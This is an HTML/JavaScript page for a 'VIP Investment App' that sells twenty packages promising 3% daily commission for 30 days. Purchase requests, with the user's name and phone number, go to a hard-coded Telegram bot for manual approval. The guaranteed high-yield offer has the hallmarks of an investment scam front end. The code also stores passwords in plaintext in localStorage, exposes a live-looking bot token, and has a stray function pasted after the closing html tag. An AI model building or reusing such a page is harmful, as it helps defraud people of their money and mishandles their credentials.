<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VIP Investment App</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    /* CSS Reset & Base */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #f2f2f2; color: #333; }
    .container { max-width: 450px; margin: auto; padding: 10px; }/* Login/Signup */
.auth-box { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #ccc; margin-top: 30px; }
.switch { text-align: center; margin-bottom: 15px; }
.switch button { padding: 5px 15px; margin: 0 5px; }
.auth-box input { width: 100%; padding: 8px; margin: 5px 0; border-radius: 5px; border: 1px solid #ccc; }
.auth-box button { width: 100%; padding: 10px; background: #0b84ff; color: #fff; border: none; border-radius: 5px; }

/* Home Page */
#home { display: none; }
.profile-icon { text-align: center; margin-top: 20px; }
.profile-icon i { font-size: 50px; color: #333; }
.username { text-align: center; margin-top: 5px; font-weight: bold; }
.balance-box { background: #0b84ff; color: #fff; text-align: center; padding: 10px; margin: 10px 0; border-radius: 8px; cursor: pointer; transition: background 0.3s; }
.balance-box.active { background: #fff; color: #0b84ff; border: 1px solid #0b84ff; }
.scrolling-text { white-space: nowrap; overflow: hidden; box-sizing: border-box; margin: 10px 0; background: #ffdf00; padding: 5px; font-weight: bold; }
.scrolling-text span { display: inline-block; padding-left: 100%; animation: scroll 10s linear infinite; }
@keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }

.buttons-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
.btn { padding: 15px; background: #fff; border-radius: 8px; text-align: center; box-shadow: 0 0 5px #ccc; cursor: pointer; font-weight: bold; }
.logout { margin-top: 20px; text-align: center; }
.logout button { background: red; color: #fff; padding: 10px; border: none; border-radius: 5px; }

/* VIP Package Page */
#vip-packages { display: none; background: #fff; padding: 10px; margin-top: 15px; border-radius: 10px; }
.package { border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; border-radius: 8px; }
.package button { background: green; color: #fff; padding: 5px 10px; border: none; border-radius: 5px; }

  </style>
</head>
<body>
  <div class="container">
    <!-- Login/Signup Box -->
    <div id="auth" class="auth-box">
      <div class="switch">
        <button onclick="showLogin()">Login</button>
        <button onclick="showSignup()">Sign Up</button>
      </div>
      <div id="login-form">
        <input type="text" id="loginPhone" placeholder="Phone Number">
        <input type="password" id="loginPass" placeholder="Password">
        <button onclick="loginUser()">Login</button>
      </div>
      <div id="signup-form" style="display:none;">
        <input type="text" id="signupName" placeholder="Name">
        <input type="text" id="signupPhone" placeholder="Phone Number">
        <input type="password" id="signupPass" placeholder="Password">
        <button onclick="signupUser()">Sign Up</button>
      </div>
    </div><!-- Home Page -->
<div id="home">
  <div class="profile-icon">
    <i class="fas fa-user-circle"></i>
    <div class="username" id="usernameDisplay"></div>
  </div>
  <div class="balance-box" onclick="toggleBalance(this)">
    Balance
    <span id="balanceAmount" style="display:none;">0 BDT</span>
  </div>
  <div class="scrolling-text"><span>Welcome to the VIP Investment App. Earn 3% daily commission on your packages!</span></div>
  <div class="buttons-grid">
    <div class="btn">Profile</div>
    <div class="btn">Refer</div>
    <div class="btn">About</div>
    <div class="btn" onclick="showVIPPackages()">Investment</div>
    <div class="btn">Withdraw</div>
    <div class="btn">Transaction</div>
    <div class="btn">Plan</div>
    <div class="btn">Tasks</div>
  </div>
  <div class="logout">
    <button onclick="logoutUser()">Logout</button>
  </div>

  <!-- VIP Packages -->
  <div id="vip-packages"></div>
</div>

  </div>  <script>
    // Show login/signup
    function showLogin() {
      document.getElementById('login-form').style.display = 'block';
      document.getElementById('signup-form').style.display = 'none';
    }
    function showSignup() {
      document.getElementById('login-form').style.display = 'none';
      document.getElementById('signup-form').style.display = 'block';
    }

    // Sign Up
    function signupUser() {
      const name = document.getElementById('signupName').value;
      const phone = document.getElementById('signupPhone').value;
      const pass = document.getElementById('signupPass').value;
      if (!name || !phone || !pass) return alert('Fill all fields');
      localStorage.setItem('user', JSON.stringify({ name, phone, pass, balance: 0 }));
      alert('Signup successful!');
      loginUser(phone, pass);
    }

    // Login
    function loginUser(phoneInput, passInput) {
      const user = JSON.parse(localStorage.getItem('user'));
      const phone = phoneInput || document.getElementById('loginPhone').value;
      const pass = passInput || document.getElementById('loginPass').value;
      if (user && user.phone === phone && user.pass === pass) {
        document.getElementById('auth').style.display = 'none';
        document.getElementById('home').style.display = 'block';
        document.getElementById('usernameDisplay').innerText = user.name;
        updateBalance();
      } else {
        alert('Invalid login');
      }
    }

    // Logout
    function logoutUser() {
      document.getElementById('auth').style.display = 'block';
      document.getElementById('home').style.display = 'none';
    }

    // Toggle balance
    function toggleBalance(el) {
      const span = document.getElementById('balanceAmount');
      if (span.style.display === 'none') {
        span.style.display = 'inline';
        el.classList.add('active');
      } else {
        span.style.display = 'none';
        el.classList.remove('active');
      }
    }

    // Show VIP Packages
    function showVIPPackages() {
      const vipDiv = document.getElementById('vip-packages');
      if (vipDiv.style.display === 'none' || vipDiv.innerHTML === '') {
        let html = '<h3>VIP Packages</h3>';
        for (let i = 1; i <= 20; i++) {
          const price = 200 + (i - 1) * 100;
          html += `<div class="package">
            <b>Package ${i}</b><br>
            Price: ${price} BDT<br>
            Daily Commission: 3%<br>
            Duration: 30 Days<br>
            <button onclick="buyPackage(${price}, ${i})">Buy</button>
          </div>`;
        }
        vipDiv.innerHTML = html;
        vipDiv.style.display = 'block';
      } else {
        vipDiv.style.display = 'none';
      }
    }

    // Buy Package (Telegram)
    function buyPackage(price, pkgNum) {
      const user = JSON.parse(localStorage.getItem('user'));
      const message = `VIP Package Request\nName: ${user.name}\nPhone: ${user.phone}\nPackage ${pkgNum} - Price: ${price} BDT\nApprove or Reject below.`;
      const token = '7430982435:AAEWnrZZlKM7QbR__YdjnCePJCSu0ASHprI';
      const chatId = '6105596008';
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          reply_markup: {
            inline_keyboard: [[
              { text: 'Approve', callback_data: 'approve_' + pkgNum },
              { text: 'Reject', callback_data: 'reject_' + pkgNum }
            ]]
          }
        })
      }).then(() => alert('Package request sent!'));
    }

    // Update balance display
    function updateBalance() {
      const user = JSON.parse(localStorage.getItem('user'));
      document.getElementById('balanceAmount').innerText = user.balance + ' BDT';
    }
  </script></body>
</html>
function checkPackageStatus(phone, pkgNum) {
  const statusBoxId = `status_${pkgNum}`;
  const div = document.getElementById(statusBoxId) || document.createElement('div');
  div.id = statusBoxId;
  div.style.marginTop = '5px';
  div.style.fontWeight = 'bold';

  const pkgDiv = document.querySelector(`.package:nth-child(${pkgNum})`);
  pkgDiv.appendChild(div);

  const interval = setInterval(() => {
    fetch(`/status/${phone}/${pkgNum}`)
      .then(res => res.json())
      .then(data => {
        if (data.status === 'approved') {
          div.innerText = '✅ Approved';
          div.style.color = 'green';
          clearInterval(interval);
        } else if (data.status === 'reject') {
          div.innerText = '❌ Rejected';
          div.style.color = 'red';
          clearInterval(interval);
        }
      });
  }, 5000);
}
